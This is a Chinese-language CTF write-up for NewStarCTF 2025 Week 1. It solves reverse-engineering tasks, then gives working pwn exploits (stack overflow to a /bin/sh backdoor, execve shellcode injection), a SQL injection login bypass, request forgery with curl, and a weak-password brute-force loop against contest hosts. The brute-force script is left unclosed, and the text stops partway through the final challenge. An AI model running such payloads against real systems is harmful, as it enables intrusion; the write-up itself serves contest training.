---
order: 1
---

<meta name="referrer" content="no-referrer" />

# Week 1

## RE

![](https://gitee.com/ttovlove/images/raw/master/CTFHUB_WEB/202603031931766.png)

### puzzle

先使用`exeinfo`查看下程序信息

![image-20251012183722849](https://gitee.com/ttovlove/images/raw/master/CTFHUB_WEB/202603031925558.png)

64位程序，使用ida64打开分析

![](https://gitee.com/ttovlove/images/raw/master/CTFHUB_WEB/202603031925991.png)

可以看到程序提示说`flag`被分割为了`4`部分，还提示说`shift+f12`可能会发现有用的信息

但是这里程序在输出提示信息前调用了一个`Puzzle_Challenge();`函数

先跟进看一下

![image-20251012185447165](https://gitee.com/ttovlove/images/raw/master/CTFHUB_WEB/202603031925361.png)

这里对两个字符串做了一个简单的拼接

这里的结果应该是

这个应该是第一部分的`flag`

**part1**

```
Do_Y0u_
```

按`shift+f12`查看字符串

![](https://gitee.com/ttovlove/images/raw/master/CTFHUB_WEB/202603031925768.png)

发现第一个字符串就像`flag`的一部分

双击跟进

![](https://gitee.com/ttovlove/images/raw/master/CTFHUB_WEB/202603031925952.png)

发现这是第四部分

**part4**

```
1e_Gam3
```

接着看字符串，发现关于第二部分的信息

![image-20251012184158426](https://gitee.com/ttovlove/images/raw/master/CTFHUB_WEB/202603031925773.png)

同样的双击跟进

![image-20251012184305334](https://gitee.com/ttovlove/images/raw/master/CTFHUB_WEB/202603031925488.png)

![image-20251012184332603](https://gitee.com/ttovlove/images/raw/master/CTFHUB_WEB/202603031925178.png)

这里说第二部分就是函数的名字

**part2**

```
Like_7his_Jig
```

回到字符串界面接着看

发现这里有提示按`shift+e`来分析数据的内容

![image-20251012184457319](https://gitee.com/ttovlove/images/raw/master/CTFHUB_WEB/202603031925716.png)

跟进一下，发现这是第三部分相关的信息

![image-20251012184552960](https://gitee.com/ttovlove/images/raw/master/CTFHUB_WEB/202603031926138.png)

跟进这个函数

![image-20251012184647336](https://gitee.com/ttovlove/images/raw/master/CTFHUB_WEB/202603031926957.png)

这里可以发现对`encrypted_array`和`0xAD`做了简单的异或操作

查看这个数组的内容，发现是乱码

![image-20251012184822623](https://gitee.com/ttovlove/images/raw/master/CTFHUB_WEB/202603031926366.png)

但是在这个函数中有提示说按`shift+e`解析这块数据

![image-20251012184910774](https://gitee.com/ttovlove/images/raw/master/CTFHUB_WEB/202603031926910.png)

可以解析为`16`进制数据

编写一个脚本还原这一块数据

```python
part3 = [0xDE, 0xED, 0xDA, 0xF2, 0xDD, 0xD8, 0xD7, 0xD7, 0x00]
v2 = 8
flag_part3 = [x ^ 0xAD for x in part3[:v2]]
print(''.join(map(chr, flag_part3)))
```

![image-20251012185138986](https://gitee.com/ttovlove/images/raw/master/CTFHUB_WEB/202603031926743.png)

**part3**

```
s@w_puzz
```

将四部分拼接起来就是flag

**flag**

```
flag{Do_Y0u_Like_7his_Jigs@w_puzz1e_Gam3}
```





### Strange Base

先查看下程序的信息

![image-20251012194957924](https://gitee.com/ttovlove/images/raw/master/CTFHUB_WEB/202603031926890.png)

使用`ida64`反编译程序

![image-20251012195041933](https://gitee.com/ttovlove/images/raw/master/CTFHUB_WEB/202603031926626.png)

这里可以看出主函数调用的关键函数就是`base64_encode()`这个函数

![image-20251012195242090](https://gitee.com/ttovlove/images/raw/master/CTFHUB_WEB/202603031926600.png)

程序逻辑很简单：

1. 读取输入 `Str`。
2. 用一个自定义字母表做 `Base64` 编码：`base64_encode(Str, Buf1, strlen(Str))`。
3. 把结果和常量串 `Buf2 = "T>6uTqOatL39aP!YIqruyv(YBA!8y7ouCa9="` 比较，完全一致就通过。

关键在于：不是标准 Base64 字母表。

![image-20251012195314930](https://gitee.com/ttovlove/images/raw/master/CTFHUB_WEB/202603031926329.png)

```
aHelloACrqzyB4s db 'HElLo!A=CrQzy-B4S3|is',27h,'waITt1ng&Y0u^{/(>v<)*}GO~256789pPqWXV'
db 'KJNMF',0
```

把它合并成完整 64 个字符：

```
HElLo!A=CrQzy-B4S3|is'waITt1ng&Y0u^{/(>v<)*}GO~256789pPqWXVKJNMF
```

所以这里只需要直接按该字母表实现`base64`解码就可以

![image-20251012195516941](https://gitee.com/ttovlove/images/raw/master/CTFHUB_WEB/202603031926335.png)

```python
def decode_custom_base64(s, alpha):
    idx = {ch: i for i, ch in enumerate(alpha)}
    out = bytearray()
    i = 0
    while i < len(s):
        c0, c1, c2, c3 = s[i:i+4]; i += 4
        a = idx[c0]; b = idx[c1]
        if c2 == '=':
            out.append(((a << 2) | (b >> 4)) & 0xFF)
            break
        c = idx[c2]
        if c3 == '=':
            out += bytes([
                ((a << 2) | (b >> 4)) & 0xFF,
                (((b & 0xF) << 4) | (c >> 2)) & 0xFF,
            ])
            break
        d = idx[c3]
        out += bytes([
            ((a << 2) | (b >> 4)) & 0xFF,
            (((b & 0xF) << 4) | (c >> 2)) & 0xFF,
            (((c & 0x3) << 6) | d) & 0xFF,
        ])
    return bytes(out)

alpha = "HElLo!A=CrQzy-B4S3|is'waITt1ng&Y0u^{/(>v<)*}GO~256789pPqWXVKJNMF"
buf2  = "T>6uTqOatL39aP!YIqruyv(YBA!8y7ouCa9="
print(decode_custom_base64(buf2, alpha).decode())
```

**flag**

```
flag{Wh4t_a_cra2y_8as3!!!}
```





### EzMyDroid

一个`apk`文件，先使用`apktool`将程序解包

![](https://gitee.com/ttovlove/images/raw/master/CTFHUB_WEB/202603031926111.png)

使用`jadx`打开项目，主程序的项目在`smali_classes2`文件夹中，找到主函数

![](https://gitee.com/ttovlove/images/raw/master/CTFHUB_WEB/202603031927073.png)



![](https://gitee.com/ttovlove/images/raw/master/CTFHUB_WEB/202603031927883.png)



`FirstFragment` 用 `AESECBUtils.encrypt(input, "1145141919810000")` 对输入做 AES-128-ECB + 填充 然后再 Base64 编码，程序把结果与常量 `cTz2pDhl8fRMfkkJXfqs2t8JBsqLkvQZDLYpWjEtkLE=` 比较。

这里要通过检查，直接把该常量 Base64 → AES-ECB 解密（key="1145141919810000"）→ 去掉 PKCS#7 填充 就得到应提交的文本。

![image-20251012200015866](https://gitee.com/ttovlove/images/raw/master/CTFHUB_WEB/202603031927982.png)



##### exp

```python
from Crypto.Cipher import AES
import base64
ct = base64.b64decode("cTz2pDhl8fRMfkkJXfqs2t8JBsqLkvQZDLYpWjEtkLE=")
k = b"1145141919810000"
pt = AES.new(k, AES.MODE_ECB).decrypt(ct)
# 去除 PKCS#7 填充
pt = pt[:-pt[-1]]
print(pt.decode())
```

**flag**

```
flag{@_g00d_st@r7_f0r_ANDROID}
```



### plzdebugme

检查文件信息

![image-20251012200124301](https://gitee.com/ttovlove/images/raw/master/CTFHUB_WEB/202603031927375.png)

是一个`64`位的`elf`文件，先用`ida64`分析一下

![](https://gitee.com/ttovlove/images/raw/master/CTFHUB_WEB/202603031927475.png)

提示说`flag`在`x0r()`函数生成的，在该函数下断点

这里我在`x0r()`函数入口处下断点，然后步进函数查看详细的过程

![image-20251012200643273](https://gitee.com/ttovlove/images/raw/master/CTFHUB_WEB/202603031927010.png)

使用`ida`在`ubuntu`上开启服务，远程调试

![](https://gitee.com/ttovlove/images/raw/master/CTFHUB_WEB/202603031927693.png)

开启调试后，程序停在`x0r()`入口处，按`F7`步进，先让函数循环走两轮，跟进`flag`发现已经生成部分了

![](https://gitee.com/ttovlove/images/raw/master/CTFHUB_WEB/202603031927537.png)

接着让函数循环走完

![](https://gitee.com/ttovlove/images/raw/master/CTFHUB_WEB/202603031927467.png)

再查看`flag`的值

选中按`a`即可查看到`flag`

![](https://gitee.com/ttovlove/images/raw/master/CTFHUB_WEB/202603031928329.png)

**flag**

```
flag{It3_D3bugG_T11me!_le3_play}
```



### X0r

查看程序的信息

![image-20251012201144729](https://gitee.com/ttovlove/images/raw/master/CTFHUB_WEB/202603031928966.png)

使用`ida64`反编译

![](https://gitee.com/ttovlove/images/raw/master/CTFHUB_WEB/202603031928964.png)

程序的逻辑非常的简单，对输入做两轮异或

第一轮异或（按位置模 3 选 key）

```c
for ( i = 0; i < v7; ++i )
  if ( i % 3 == 0 )      Str[i] ^= 0x14;
  else if ( i % 3 == 1 ) Str[i] ^= 0x11;
  else                   Str[i] ^= 0x45;
```

每个字节被不同常量异或一次，顺序与 key 为
`[0x14, 0x11, 0x45]` 循环 8 次（24/3）。

第二轮异或（循环 key 串）

```c
v5[0]=19; v5[1]=19; v5[2]=81;     // 即 0x13, 0x13, 0x51
for ( j = 0; j < v7; ++j )
  Str[j] ^= v5[j % 3];
```

再次异或，key 串 `19 19 81` 循环 8 次。

最后与密文比较

```c
strcpy(Str2, "anu`ym7wKLl$P]v3q%D]lHpi");
if (!strcmp(Str, Str2)) …
```

经过上面两轮异或后的 24 字节必须等于`anuym7wKLl$P]v3q%D]lHpi`

程序的原始逻辑是：原 flag → step1 异或 (0x14/0x11/0x45) → step2 再异或 v5 → 得到目标字符串 `anu\ym7wKLl$P]v3q%D]lHpi`。
所以我们解密时要反过来做：

1. 先对目标串 `c` 逆向第二步（再 XOR 一次 v5）。
2. 再对结果逆向第一步（根据位置还原原 flag）。

![](https://gitee.com/ttovlove/images/raw/master/CTFHUB_WEB/202603031928168.png)

##### exp

```python
v5 = [19, 19, 81]
c = "anu`ym7wKLl$P]v3q%D]lHpi"
v7 = len(c)

tmp = [ord(c[i]) ^ v5[i % 3] for i in range(v7)]


flag_chars = []
for i in range(v7):
    if i % 3 == 0:
        flag_chars.append(chr(tmp[i] ^ 0x14))
    elif i % 3 == 1:
        flag_chars.append(chr(tmp[i] ^ 0x11))
    else:
        flag_chars.append(chr(tmp[i] ^ 0x45))

flag = "".join(flag_chars)
print(flag)
```



**flag**

```
flag{y0u_Kn0W_b4s1C_xOr}
```





## PWN

### GNU Debugger

运行程序看一下，是一道引导的题目。开始过关

第一关

要查看`r12`寄存器里存的值

了解过`gdb`的命令都知道`64`位程序查看寄存器的命令

```
x/gx $r12
```

![](https://gitee.com/ttovlove/images/raw/master/NewstarCTF2025/202603121444328.png)

接着到第二关

要查看指定位置存放的字符串

使用`x/s`命令查看

![](https://gitee.com/ttovlove/images/raw/master/NewstarCTF2025/202603121445964.png)

第三关

要下断点，在`gdb`中下断点的命令是`break`,使用缩写`b`就可以，但是这里使用临时断点`tbreak`，而在指定内存位置下端点要以指针的形式

![](https://gitee.com/ttovlove/images/raw/master/NewstarCTF2025/202603121445086.png)

第四关

查看题目的对应地址当前的值，发现就是题目描述的`1`个

使用`set`命令将该位置的值设置为题目要求的`0xdeadbeef`个

成功过关，得到`flag`

![](https://gitee.com/ttovlove/images/raw/master/NewstarCTF2025/202603121445281.png)

**flag**

```
flag{277e6bf1-64c4-4fee-94e7-60e20ed61df4}
```



### INTbug

使用`ida64`打开分析

![image-20251012173754367](https://gitee.com/ttovlove/images/raw/master/NewstarCTF2025/202603121445325.png)

主函数简单的输出欢迎信息，调用`func()`函数

接着跟进`func()`函数

![image-20251012173910611](https://gitee.com/ttovlove/images/raw/master/NewstarCTF2025/202603121445197.png)

对该函数进行分析

- `v1` 是 `__int16`（16 位有符号整数），初始化为 0。
- 循环里每次通过 `scanf` 读一个整数到 `v2`。
- 如果 `v2 <= 0` 就跳出循环（程序最终打印 “You can only input positive number!”）。
- 如果 `v2 > 0`，执行 `++v1`，然后判断 `++v1 < 0`。  
  → 也就是说当 `v1` 在自增后变成**负数**时成立，接着打印 `"You got it!"` 并执行 `system("cat flag")`（输出 flag）。
- `v1` 的取值范围（int16）是 `-32768` .. `32767`。从 `0` 开始逐次 `++`，在第 `32768` 次 `++` 时 `v1` 将从 `32767` 溢出到 `-32768`（在机器指令层面是按位递增并绕回），于是 `++v1 < 0` 成立。

这里要触发 `system("cat flag")`，只需要让循环中的 `++v1 < 0` 成立 —— 即让 `v1` 从 0 连续自增到溢出为负。需要的正数输入次数为：

- 需要 **32768 次** 正数输入（第一次 ++ 会把 v1 变为 1，……第 32767 次后为 32767，第 32768 次 ++ 后变为 -32768，从而 `< 0` 成立）。

因此：向程序的标准输入连续提供 32768 个 **正整数**（例如全部为 `1`），就能在第 32768 次读入后看到 `You got it!` 并且执行 `cat flag`。

![](https://gitee.com/ttovlove/images/raw/master/NewstarCTF2025/202603121445392.png)

**flag**

```
flag{9feefa11-9514-48bb-9df1-c542f75023e4}
```



##### exp

```python
from pwn import *

context.log_level = 'info'

#p = process()
p = remote('39.106.48.123',31564)

payload = b'1\n' * 32768 + b'0\n'
p.send(payload)

try:
    print(p.recvuntil(b'You got it!\n', timeout=10).decode())
except EOFError:
    pass

try:
    out = p.recvall(timeout=5)
    print(out.decode(errors='ignore'))
except Exception as e:
    print(b"recvall error:", e)

p.close()
```



### pwn's door

同样的使用`ida64`打开分析

![](https://gitee.com/ttovlove/images/raw/master/NewstarCTF2025/202603121446505.png)

程序逻辑非常简单

接收一个输入，赋值给`v4`，判断输入这个值是否等于`7038329`

![](https://gitee.com/ttovlove/images/raw/master/NewstarCTF2025/202603121446126.png)

**flag**

```
flag{70c7a205-42e0-4e67-8eeb-efc036b525fe}
```



##### exp

```python
from pwn import *

p = remote('47.94.87.199',39166)

p.recvuntil(b'password: ')
p.sendline(b'7038329')

p.interactive()

```







### overflow

先查看下文件的属性

![image-20251012182314788](https://gitee.com/ttovlove/images/raw/master/NewstarCTF2025/202603121446952.png)

同样的`64`位程序，使用`ida64`位程序

![image-20251012175453221](https://gitee.com/ttovlove/images/raw/master/NewstarCTF2025/202603121446830.png)

主函数比较简单，输出介绍信息和调用函数

分别跟进两个函数`show()`和`try()`

在`try()`函数中发现了漏洞点

![image-20251012175601688](https://gitee.com/ttovlove/images/raw/master/NewstarCTF2025/202603121446798.png)

这里的`s`定义的大小是256，而这里使用`gets()`函数读取用户的输入，没有限定大小，导致栈溢出漏洞

这里还在函数中发现了后门函数

![image-20251012180126838](https://gitee.com/ttovlove/images/raw/master/NewstarCTF2025/202603121446182.png)

看一下后门函数的地址

![image-20251012180202095](https://gitee.com/ttovlove/images/raw/master/NewstarCTF2025/202603121446573.png)

这里的思路就是利用`try()`函数中的溢出来控制程序的运行流程到`backd00r()`函数，从而执行`system("/bin/sh");`来成功`getshell`

但是这里第一次运行后发现不能成功，才发现这里溢出后栈没有对齐

![](https://gitee.com/ttovlove/images/raw/master/NewstarCTF2025/202603121446019.png)

所以这里还需要一个`return`来确保栈对齐

使用`ROPgadget`来获取一个`return`的地址

![image-20251012182003624](https://gitee.com/ttovlove/images/raw/master/NewstarCTF2025/202603121446508.png)

所以最后的`payload`就应该是

```
payload  = b'A' * 256 + p64(1) + p64(ret_addr) + p64(backdoor_addr)
```



##### exp

```python
from pwn import *

#p = process('./overflow')
p = remote('39.106.48.123',42727)

backdoor_addr = 0x401200
ret_addr = 0x401016

payload = b"A"*256 + p64(1) + p64(ret_addr) + p64(backdoor_addr)

p.sendlineafter(b"Enter your input:", payload)
p.interactive()
```



![2](https://gitee.com/ttovlove/images/raw/master/NewstarCTF2025/202603121446916.png)

**flag**

```
flag{392fabe8-71f4-4418-987f-a272701e9fdf}
```



### input_function

同样的使用`ida64`打开分析

![image-20251012182505569](https://gitee.com/ttovlove/images/raw/master/NewstarCTF2025/202603121447138.png)

这个题目的核心在于

```markdown
buf = mmap((void *)0x114514, 0x1000uLL, 7, 34, -1, 0LL);
read(0, buf, 0x500uLL);
((void (*)(void))buf)();
```

程序用 `mmap` 分配了一块可执行、可写的内存（7 = PROT_READ|PROT_WRITE|PROT_EXEC），然后从标准输入读取数据写进去，最后直接把这块内存当函数指针调用。

程序的大致逻辑是：

1. 程序初始化 `mmap` 出一块 RWX 内存。
2. `read` 从 stdin 读你输入的“数据”到这块内存。
3. 把这块内存当作函数执行。

所以这里解题思路就是：

1. 编写 shellcode，目标是执行命令（比如 `/bin/sh`）在 x86_64 架构下，可以直接写标准 Linux syscall 的 shellcode。

  `/bin/sh` shellcode：
  ```asm
  ; execve("/bin/sh", 0, 0)
  xor rax, rax
  mov rbx, 0x68732f6e69622f ; "/bin/sh"
  push rbx
  mov rdi, rsp        ; rdi = "/bin/sh"
  xor rsi, rsi        ; argv = NULL
  xor rdx, rdx        ; envp = NULL
  mov al, 59         ; syscall number of execve
  syscall
  ```

  编译好之后转成机器码，就是输入给程序的 payload。

2. 把 shellcode 输入给程序，直接运行目标程序，然后输入编译好的机器码。

这里写 shellcode 并转机器码

用 `nasm` 编译：
```asm
section .text
   global _start
_start:
   xor rax, rax
   mov rbx, 0x68732f6e69622f
   push rbx
   mov rdi, rsp
   xor rsi, rsi
   xor rdx, rdx
   mov al, 59
   syscall
```



##### exp

```python
import sys
import argparse
import os
import socket
import time

SHELLCODE = (
    b"\x48\x31\xd2"                                # xor    rdx,rdx
    b"\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68"    # movabs rbx,0x68732f2f6e69622f   ; "//bin/sh"
    b"\x48\xc1\xeb\x08"                            # shr    rbx,0x8   -> "/bin/sh"
    b"\x53"                                        # push   rbx
    b"\x48\x89\xe7"                                # mov    rdi,rsp
    b"\x50"                                        # push   rax
    b"\x57"                                        # push   rdi
    b"\x48\x89\xe6"                                # mov    rsi,rsp
    b"\xb0\x3b"                                    # mov    al,0x3b
    b"\x0f\x05"                                    # syscall
)

def try_import_pwntools():
    try:
        from pwn import remote, process, context
        return True
    except Exception:
        return False

def interact_with_socket(sock):
    """Basic interactive loop if pwntools not available."""
    try:
        import threading, sys, select

        def recv_thread():
            try:
                while True:
                    data = sock.recv(4096)
                    if not data:
                        break
                    sys.stdout.buffer.write(data)
                    sys.stdout.buffer.flush()
            except Exception:
                pass

        t = threading.Thread(target=recv_thread, daemon=True)
        t.start()

        while True:
            # wait for user input
            rlist, _, _ = select.select([sys.stdin], [], [])
            if sys.stdin in rlist:
                line = sys.stdin.buffer.read1(4096)
                if not line:
                    break
                sock.sendall(line)
    except KeyboardInterrupt:
        pass
    finally:
        try:
            sock.close()
        except Exception:
            pass

def exploit_remote(host, port, shellcode, use_pwntools=True):
    if use_pwntools and try_import_pwntools():
        from pwn import remote, context
        context.update(arch='amd64', os='linux')
        print(f"[+] Using pwntools to connect {host}:{port}")
        r = remote(host, port)
        # send shellcode directly; the target does read(0, buf, 0x500)
        r.send(shellcode)
        print("[+] Shellcode sent, switching to interactive mode. Try `ls` / `cat flag`.")
        r.interactive()
    else:
        print(f"[+] Using plain socket to connect {host}:{port}")
        sock = socket.create_connection((host, port), timeout=10)
        # send shellcode
        sock.sendall(shellcode)
        print("[+] Shellcode sent, entering basic interactive mode. Ctrl-C to quit.")
        interact_with_socket(sock)

def exploit_local(path, shellcode, use_pwntools=True):
    if use_pwntools and try_import_pwntools():
        from pwn import process, context
        context.update(arch='amd64', os='linux')
        print(f"[+] Spawning local process: {path}")
        p = process(path)
        # give it a moment to reach read
        time.sleep(0.1)
        p.send(shellcode)
        print("[+] Shellcode sent to local process, switching to interactive.")
        p.interactive()
    else:
        print(f"[+] Spawning local process via subprocess: {path}")
        import subprocess
        proc = subprocess.Popen([path], stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
        # send shellcode
        proc.stdin.write(shellcode)
        proc.stdin.flush()
        print("[+] Shellcode written to stdin. Now piping stdout to your terminal (press Ctrl-C to stop).")
        try:
            while True:
                out = proc.stdout.read(1)
                if not out:
                    break
                sys.stdout.buffer.write(out)
                sys.stdout.buffer.flush()
        except KeyboardInterrupt:
            pass
        finally:
            proc.kill()

def main():
    parser = argparse.ArgumentParser(description="Send execve('/bin/sh') shellcode to remote/local target.")
    group = parser.add_mutually_exclusive_group(required=True)
    group.add_argument('--remote', '-r', help='remote target in host:port form', metavar='HOST:PORT')
    group.add_argument('--local', '-l', help='path to local binary to spawn', metavar='BINARY')
    parser.add_argument('--no-pwntools', action='store_true', help='do not try to use pwntools even if installed')
    parser.add_argument('--shellcode-file', '-f', help='optionally send raw shellcode from file instead of built-in', metavar='FILE')
    args = parser.parse_args()

    use_pwntools = not args.no_pwntools

    shellcode = SHELLCODE
    if args.shellcode_file:
        shellcode = open(args.shellcode_file, 'rb').read()
        print(f"[+] Loaded {len(shellcode)} bytes shellcode from {args.shellcode_file}")

    if args.remote:
        if ':' not in args.remote:
            print("Remote target must be host:port")
            sys.exit(1)
        host, port_s = args.remote.split(':', 1)
        port = int(port_s)
        exploit_remote(host, port, shellcode, use_pwntools=use_pwntools)
    else:
        path = args.local
        if not os.path.exists(path):
            print("Local binary not found:", path)
            sys.exit(1)
        exploit_local(path, shellcode, use_pwntools=use_pwntools)

if __name__ == '__main__':
    main()
```



![](https://gitee.com/ttovlove/images/raw/master/NewstarCTF2025/202603121447987.png)

**flag**

```
flag{1db5a10c-514b-4a36-9aff-65a24d9da3da}
```



## WEB

### strange_login

管理员可以访问密码信息
输入一个不闭合的语句尝试

```
or 1=1'
```

报错

![](https://gitee.com/ttovlove/images/raw/master/NewstarCTF2025/202603131400045.png)

这里报错说明输入的`or 1=1'`这种 payload，后端直接拼接进 SQL 语句导致报错。  这里输入的语句拼进去后就变成了：

```
SELECT * FROM users WHERE username = ''or 1 = 1'';
```

前后引号不匹配导致SQL 语法错误。 

那这里我们使用单引号闭合

```
' OR 1=1 -- （注意这里最后有一个空格）
```

直接登录成功得到flag

![](https://gitee.com/ttovlove/images/raw/master/NewstarCTF2025/202603131400507.png)

**flag**

```
flag{3b3022aa-9b23-4e9a-b6d9-0b4feb6a9b92}
```





### multi-headach3

访问`robots.txt`

得到

```
User-agent: *\r
Disallow: /hidden.php
```

访问一下

```
curl -A "Googlebot" https://eci-2ze6kxrfkqdjop8wpy8f.cloudeci1.ichunqiu.com:80/hidden.php
```

没有输出

用 `curl` 抓页面源代码看看有没有 `<head>` 隐藏信息：

```
curl https://eci-2ze6kxrfkqdjop8wpy8f.cloudeci1.ichunqiu.com:80/hidden.php -i
```

![](https://gitee.com/ttovlove/images/raw/master/NewstarCTF2025/202603131400535.png)

**flag**

```
flag{f2055df0-6d2d-4141-8979-ae77dccbefdb}
```





### 宇宙的中心是php

按`ctrl+u`和`F12`没有用

`curl`发包试一下

发现有一个隐藏的界面`s3kret.php`，接着发包得到以下内容：

```

&nbsp;&nbsp;&nbsp;&nbsp;$answer&nbsp;=&nbsp;$_POST<span style="color&nbsp;&nbsp;&nbsp;&nbsp;if(</span><span style="color: #0000BB">intval</span><span style="color: #007700">!=</span><span style="color: #0000BB">47</span><span style="color: #007700">&amp;&amp;</span><span style="color: #0000BB">intval</span><span style="color: #007700">(</span><span style="color: #0000BB">$answer</span><span style="color: #007700">,</span><span style="color: #0000BB">0</span><span style="color: #007700">)==</span><span style="color: #0000BB">47</span><span sty<br />}</span>bsp;&nbsp;&nbsp;}nbsp;&nbsp;&nbsp;&nbsp;echo&nbsp;</span><span style="color: #DD0000">"你还未参透奥秘"</span><span style="color: #007700">;
</span>
```

这里查看源码，用`curl`发包可以看到，有个技巧是在网页前加`view-source:`就可以看到源码

![image-20251012164210297](https://gitee.com/ttovlove/images/raw/master/NewstarCTF2025/202603131400370.png)

这里有个隐藏的界面访问一下，得到：

![image-20251012164658244](https://gitee.com/ttovlove/images/raw/master/NewstarCTF2025/202603131401104.png)

这段代码是从 POST 表单读取 `answer` 字段。 `intval($answer)`：把 `$answer` 转成整数，默认按十进制解析（当没有第二个参数时）。`intval($answer, 0)`：带第二个参数 `base = 0` 时，PHP 会根据字符串前缀自动判断进制： 以 `0x`/`0X` 开头 → 解析为 十六进制； 以 `0` 开头（且没有 `x`） → 有些 PHP 版本视为八进制；其他 → 十进制。

这里的条件 `intval($answer) != 47 && intval($answer,0) == 47` 要求：用十进制解析不等于 `47`，且用自动识别进制（base=0）解析等于 `47`。

也就是说我们需要一个字符串，十进制解析得到的值不是 47，但被 base=0 自动识别后得到 47。 

那这里就可以用十六进制 `0x2F` 等于十进制 `47`。  `intval(\"0x2F\")`（默认十进制解析）通常会返回 `0`（因为 `\"0x2F\"` 在十进制解析下不是合法的十进制数字序列），所以 `intval($answer) != 47` 为真。 `intval(\"0x2F\", 0)` 会识别 `0x` 前缀并返回 `47`，所以 `intval($answer,0) == 47` 为真。因此字符串 `0x2F`满足两个条件。

POST传参数

```
newstar2025=0x2F
```

![](https://gitee.com/ttovlove/images/raw/master/NewstarCTF2025/202603131401482.png)

**flag**

```
flag{b3ea2d73-d0c3-41fd-a2f3-b2ef136ba7e6}
```







### 别笑，你也过不了第二关

查看下题目源码

![image-20251012165315760](https://gitee.com/ttovlove/images/raw/master/NewstarCTF2025/202603131401700.png)

![image-20251012165431415](https://gitee.com/ttovlove/images/raw/master/NewstarCTF2025/202603131401815.png)

分析一下代码

掉落物 gate：
- 加分 gate：`dataset.value = 10`，图片 `2.jpg`。
- 扣分 gate：`dataset.value = -10`，图片 `1.jpg`。

关卡参数：
- 每关固定掉落 10 个 gate（`maxSteps = 10`）。
- 第 1 关目标分数：`targetScores[0] = 30`。
- 第 2 关目标分数：`targetScores[1] = 1 000 000`。

通关判定：
1. 掉落 10 个 gate 后出现红线 finish-line，碰到即结算。
2. 分数 ≥ 目标分数 → 进入下一关。
3. 全部关卡通过 → 前端自动执行：

```js
fetch("/flag.php", {
  method: "POST",
  headers: {"Content-Type": "application/x-www-form-urlencoded"},
  body: "score=" + score
})
```

这里第二关需要`1 000 000`分才能通过，基本上不可能实现，所以这里需要通过伪造分数，绕过前端，自己发请求给 `/flag.php`

这里用 curl 直接发包：

```
curl -X POST https://eci-2zeichfolp66phg859vj.cloudeci1.ichunqiu.com:80/flag.php -d "score=1000000" 
```

![](https://gitee.com/ttovlove/images/raw/master/NewstarCTF2025/202603131401923.png)

**flag**

```
flag{7fde56ea-4543-4fcb-8db8-f7b5bd19e516}
```





### 我真得控制你了

直接发包看到源码

```
curl https://eci-2ze1shf5hg5jtqn8h1b1.cloudeci1.ichunqiu.com:80/
```

![](https://gitee.com/ttovlove/images/raw/master/NewstarCTF2025/202603131401941.png)

这题是经典 JS 反调试/反触发套路。

核心点只有两个：1) 按钮被一个覆盖层 `#shieldOverlay` 挡住；  2) 真正过关动作是提交一个表单 `POST /next-level.php`，参数里需要携带 `csrf_token`。

这里直接发 POST请求

```
curl -i -s -X POST 'https://eci-2zebayz88x9cj98tlqb7.cloudeci1.ichunqiu.com:80/next-level.php' \
  -H 'Referer: https://eci-2ze1shf5hg5jtqn8h1b1.cloudeci1.ichunqiu.com:80/' \
  -H 'User-Agent: curl' \
  --data 'access=1&csrf_token=a2aeae26fba28f795717ac646f4e067c69b0df865520934a873a6bab8b256e54'
```

进入弱口令的界面（这里将源码中的`css`都去掉了，方便分析）

```html
<!DOCTYPE html>
<html lang="zh-CN">
<head>
    <meta charset="UTF-8">
    <title>我太弱了</title>
</head>
<body>
    <div class="container">
        <h1>太弱了，太弱了！！</h1>
        
        <form method="POST">
            <div class="form-group">
                <label for="username">用户名</label>
                <input type="text" id="username" name="username" required>
            </div>
            
            <div class="form-group">
                <label for="password">密码</label>
                <input type="password" id="password" name="password" required>
            </div>
            
                        
            <button type="submit">认证</button>
        </form>
        
        <div class="hint">
            <p>弱口令是什么东西？</p>
        </div>
    </div>
</body>
</html>
```

这里页面就是一个简单的登录表单只有用户名 + 密码

写一个脚本来爆破弱口令

```shell
users='admin root test user guest'
passes='admin 123456 12345678 123456789 123123 000000 111111 888888 password qwerty 1qaz2wsx qwe123 abc123 123qwe a123456 P@ssw0rd Admin@123 admin123 admin888 root 666666 112233 admin@123'

for u in $users; do
  for p in $passes $u; do
    resp=$(mktemp)
    code=$(curl -s -b cookies.txt -c cookies.txt -w "%{http_code}" -o "$resp" \
      -H "Referer: ${HOST}weak_password.php" \
      --data "username=$u&password=$p" \
      "${HOST}weak_password.php")
    if ! grep -q '认证失败' "$resp"; then
      echo "[+] SUCCESS user=$u pass=$p http=$code"
echo "[-] 这批常见弱口令未命中。"
```

得到结果成功爆破出用户名和密码

```shell
[+] SUCCESS user=admin pass=111111 http=302
exit
```

![](https://gitee.com/ttovlove/images/raw/master/NewstarCTF2025/202603131401611.png)

由于这里要大量发包，为了方便输命令，这里对变量进行一些设置

![](https://gitee.com/ttovlove/images/raw/master/NewstarCTF2025/202603131401806.png)



接着在表单中加上用户名和密码接着发请求

```
curl -i -s -b cookies.txt -c cookies.txt -L \
  -H "Referer: ${HOST}weak_password.php" \
  --data "username=admin&password=111111" \
  "${HOST}weak_password.php"
```

这里进入到下一关

```html
<!DOCTYPE html>
<html lang="zh-CN">
<head>
    <meta charset="UTF-8">
    <title>轻轻松松绕</title>
</head>
<body>
    <div class="portal-container">
        <h1>轻轻松松绕</h1>
        <p>真的很轻松</p>
        
        <h2>源码</h2>
        <div class="code-container">
<div class="code-container"> 
    <pre class="php-code">&lt;?php
error_reporting(0);

function generate_dynamic_flag($secret) {
    return getenv("ICQ_FLAG") ?: 'default_flag';
}


if (isset($_GET['newstar'])) {
    $input = $_GET['newstar'];
    
    if (is_array($input)) {
        die("恭喜掌握新姿势");
    }
    

    if (preg_match('/[^\d*\/~()\s]/', $input)) {
        die("老套路了，行不行啊");
    }
    

    if (preg_match('/^[\d\s]+$/', $input)) {
        die("请输入有效的表达式");
    }
    
    $test = 0;
    try {
        @eval("\$test = $input;");
    } catch (Error $e) {
        die("表达式错误");
    }
    
    if ($test == 2025) {
        $flag = generate_dynamic_flag($flag_secret);
        echo "&lt;div class='success'&gt;拿下flag！&lt;/div&gt;";
        echo "&lt;div class='flag-container'&gt;&lt;div class='flag'&gt;FLAG: {$flag}&lt;/div&gt;&lt;/div&gt;";
    } else {
        echo "&lt;div class='error'&gt;大哥哥泥把数字算错了: $test ≠ 2025&lt;/div&gt;";
    }
} else {
    ?&gt;
&lt;?php } ?&gt;</pre>
        </div>
        
                                 </div>
</body>
</html>
```

分析一下关键信息： 这里的限制规则是

